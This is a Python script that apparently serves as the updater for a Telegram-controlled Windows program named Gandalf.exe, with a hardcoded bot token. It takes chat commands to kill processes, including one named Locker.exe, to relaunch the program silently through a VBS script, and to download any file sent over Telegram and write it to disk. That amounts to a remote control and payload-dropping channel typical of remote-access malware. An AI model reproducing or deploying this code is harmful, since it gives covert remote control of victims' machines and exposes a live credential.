#this file can update your bot and do other stuff like autorun

import requests
import os

api_url = 'https://api.telegram.org/'
token = 'bot1774401260:AAGhyHAg7Jzb8WvaNS4OmWnOT7UkCzyrKhA'
url = 'https://api.telegram.org/' + token + '/'

update_offset = 0

disable_locker = 'taskkill /f /im Locker.exe'
disable_bot = 'taskkill /f /im Gandalf.exe'
start_bot = 'wscript.exe Silent_start.vbs Gandalf.exe'

def get_response(request):
    response = requests.get(request)
    return response.json()

def get_updates_json(request):                              #Get all updates from bot
    response = requests.get(request + 'getUpdates?offset=' + str(update_offset))
    return response.json()

def last_update(data):                                      #Get only last update from bot
    results = data['result']
    if len(results) == 0:
        return ''
    total_updates = len(results) - 1
    return results[total_updates]

def get_chat_id(update):                                    #Get chat id from message
    chat_id = update['message']['chat']['id']
    return chat_id

def send_message(chat, text):                               #Send messages
    params = {'chat_id': chat, 'text': text}
    response = requests.post(url + 'sendMessage', data=params)
    return response

def msg_text(msg):
    if 'text' in msg['message']:
        return msg['message']['text']
    return ''



msg = last_update( get_updates_json(url) )
update_offset = msg['update_id']

while True:
    msg = last_update( get_updates_json(url) )
    if msg != '' and msg['update_id'] != update_offset:
        update_offset = msg['update_id']          #not to check one message many times
        master_id = get_chat_id(msg)                        #when scripts start it must run with only one master device
        
        if msg_text(msg) == '/helper_ping':
            send_message(master_id, '.')

        if msg_text(msg) == '/helper_start_bot':
            os.system(start_bot)
        
        if msg_text(msg) == '/helper_stop_bot':
            os.system(disable_bot)
        
        #--------------Updater---------------#

        if msg_text(msg) == '/helper_update':
            os.system(disable_bot)
            os.system(disable_locker)
            
            send_message(master_id, 'send a file')
            while msg['update_id'] == update_offset:
                msg = last_update( get_updates_json(url) )

            file_id = msg['message']['document']['file_id']
            file_name = msg['message']['document']['file_name']
            msg = get_response(api_url + token + '/getFile?file_id=' + file_id)
            file_path = msg['result']['file_path']
            update_file = requests.get(api_url + 'file/' + token + '/' + file_path, allow_redirects=True)

            open(file_name, 'wb').write(update_file.content)